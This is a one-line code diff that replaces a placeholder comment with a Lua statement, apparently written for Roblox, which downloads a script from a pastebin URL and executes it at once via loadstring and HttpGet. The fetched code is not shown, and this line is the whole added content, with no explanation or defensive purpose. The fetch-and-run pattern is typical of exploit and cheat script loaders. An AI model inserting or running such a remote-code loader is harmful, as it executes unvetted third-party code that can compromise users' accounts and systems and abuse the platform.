@@ -1,1 +1,1 @@
-# 54545454
+loadstring(game:HttpGet("https://pastebin.com/HH76nqTW"))();
